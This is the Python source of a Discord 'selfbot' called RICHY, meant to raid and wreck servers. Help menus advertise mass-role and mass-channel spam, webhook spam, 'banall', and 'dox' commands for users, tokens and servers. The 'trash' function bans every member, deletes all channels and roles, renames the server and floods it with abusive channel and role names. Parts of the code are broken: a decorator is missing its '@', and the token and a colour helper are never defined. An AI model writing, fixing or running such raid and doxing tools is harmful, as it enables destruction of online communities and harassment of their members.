import discord
from discord.ext import commands
import asyncio, random, os, requests, sys, threading, datetime, json, aiohttp
from urllib import parse
import re, time
from colorama import Fore
import os 


prefix = (".")
# u can change the prefix 

RICHY = discord.Client()
RICHY = commands.Bot(description='RICHY Selfbot', command_prefix=prefix, self_bot=True)





RICHY.remove_command('help')





@RICHY.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0)
    embed.set_author(name='RICHY SELFBOT')
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/827995216333111316/839765616407085066/GLITCH_20210409012030.gif')
    embed.set_footer(text='Created by RICHY')
    embed.add_field(name='.massroles', value='```i fuck server with roles lmao```')
    embed.add_field(name='.masschannel', value='```THIS COMMAND CREATE TONS OF CHANNELS xD```')
    embed.add_field(name='.webhookspam', value='```THIS COMMAND FILLS THE SERVER THIS SPAM lol ```')
    embed.add_field(name='.banall', value='```THIS COMMAND BANS EVERYONE```')
    embed.add_field(name='.help', value='```help command```')
    embed.add_field(name='.helphack', value='```shows hack commands```')
    await ctx.send(embed=embed) 
    
@RICHY.command()
async def helphack(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='RICHY SELFBOT')
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/827995216333111316/839765616407085066/GLITCH_20210409012030.gif')
    embed.set_footer(text='Created by RICHY')
    embed.add_field(name='>help', value='```Shows Help Cmds```')
    embed.add_field(name='>text', value='```Shows Text Cmds```')
    embed.add_field(name='>hack', value='```Shows hack Cmds```')
    embed.add_field(name='>nuke', value='```Shows nuke Cmds```')
    embed.add_field(name='>misc', value='```Shows misc Cmds```')
    await ctx.send(embed=embed)
    
@RICHY.command(pass_context=True)
async def text(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='RICHY SELFBOT | TEXT CMDS')
    embed.set_footer(text='Created by RICHY')
    embed.add_field(name='>spam', value='```Spams the chat \nParameters- >spam <int> <msg> \nEx- >spam 50 RICHY OP```')
    embed.add_field(name='>purge', value='```Deletes Your messages\nParameters- >purge <int>\nEx- >purge 50```')
    embed.add_field(name='>embed', value='```Send your Message in an Embed\nParameters- >embed <text>\nEx- >embed RichY is OP```')
    embed.add_field(name='>firstmsg', value='```Shows the first message of the chat with a jump buton\nParameters- >firstmsg\nEx- >firstmsg```')
    await ctx.send(embed=embed)

@RICHY.command(pass_context=True)
async def hack(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='RICHY SELFBOT | HACK CMDS')
    embed.set_footer(text='Created by RICHY')
    embed.add_field(name='>ip', value='```Displays info on an IP \nParameters- >ip <target> \nEx- >ip 162.159.128.233```')
    embed.add_field(name='>doxuser', value='```Displays info on a user | Only works in a server\nParameters- >doxuser <@target> \nEx- >doxuser @RICHY#9999```')
    embed.add_field(name='>doxtoken', value='```Displays info on a Discord Account \nParameters- >tdox <target-token> \nEx- >tdox mfa.W3Di4FprRZ_AXH_Y5-A9ReoshSu9Dzn_fTXrvBhwc6p3LvkYLJM4jbr338YUMZ7ECnj2zbxnKm-I2ReFh2Zp```')
    embed.add_field(name='>doxserver', value='```Displays info on a Discord Server\nParameters- >doxserver\nEx- >doxserver```')
    embed.add_field(name='>pingweb', value='```Pings the website to check whether its operational or not.\nParameters- >pingweb <website url>\nEx- >pingweb https://discord.com/```')
    embed.add_field(name='>getroles', value='```Sends all roles of a server which you dont have the perm to view | Note - Use a spam channel.\nParameters- >getroles\nEx- >getroles```')
    await ctx.send(embed=embed)
    
@RICHY.command(pass_context=True)
async def misc(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='RICHY SELFBOT | MISC CMDS')
    embed.set_footer(text='Created by RICHY')
    embed.add_field(name='>renameserver', value='```Renames the server name\nParameters- >renameserver <name>\nEx- >renameserver RICHY GOD```')
    await ctx.send(embed=embed)
    
@RICHY.command()
async def spam(ctx, amount: int, *, message):
    for _i in range(amount):
        await ctx.send(message)
  
@RICHY.command(pass_context=True)
async def nuke(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='RICHY SELFBOT | NUKE CMDS')
    embed.set_footer(text='Created by RICHY')
    embed.add_field(name='>trash', value='```Destruction 2021\nParameters- >trash <Target-server-ID> | Admin Perms Required\nEx- >trash (GUILD ID)```')
    embed.add_field(name='>rc', value='```Renames every channel to the name provided\nParameters- >rc <name>\nEx- >rc RICHY GOD```')
    embed.add_field(name='>rr', value='```Renames every role to the name provided\nParameters- >rr <name>\nEx- >rr RICHY GOD```')
    embed.add_field(name='>webhookspam', value='```Creates multiple webhooks in every channel and Spams everyone with webhook in all channel\nParameters- >webhookspam\nEx- >webhookspam```')
    embed.add_field(name='>stopwebhookspam', value='```Stops the ongoing spam\nParameters- >stopwebhookspam\nEx- >stopwebhookspam```')
    embed.add_field(name='>spamgcname', value='```Spam Changes Group chat name\nParameters- >spamgcname\nEx- >spamgcname```')
    embed.add_field(name='>delwebhook', value='```Deletes a webhook\nParameters- >delwebhook <webhook>\nEx- >delwebhook (WEBHOOKlink)```')
    await ctx.send(embed=embed)

RICHY.command(aliases=['trash', 'wizz'])
async def trash(ctx):
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

    try:
        await ctx.guild.edit(name='RICHY TRASHED THIS SERVER',
          description='RICHY got no chill',
          reason='ripped by RICHY',
          icon=None,
          banner=None)
    except:
        pass

    for _i in range(100):
        await ctx.guild.create_text_channel(name='richy runs you')

    for _i in range(100):
        await ctx.guild.create_role(name='RICHY fucked you', color=(RandomColor()))
  
@RICHY.command(aliases=['whois'])
async def doxuser(ctx, member: discord.Member=None):
    if not member:
        member = ctx.message.author
    roles = [role for role in member.roles]
    embed = discord.Embed(colour=(discord.Colour.default()), timestamp=(ctx.message.created_at), title=f"User Info - {member}")
    embed.set_thumbnail(url=(member.avatar_url))
    embed.set_footer(text='Created By RICHY')
    embed.add_field(name='ID:', value=(member.id))
    embed.add_field(name='Display Name:', value=(member.display_name))
    embed.add_field(name='Created Account On:', value=(member.created_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')))
    embed.add_field(name='Joined Server On:', value=(member.joined_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')))
    embed.add_field(name='Roles:', value=(''.join([role.mention for role in roles])))
    embed.add_field(name='Highest Role:', value=(member.top_role.mention))
    print(member.top_role.mention)
    await ctx.send(embed=embed)


print("CONNECTED TO RICHY SELFBOT!!! lmao")

RICHY.run(token, bot=False)
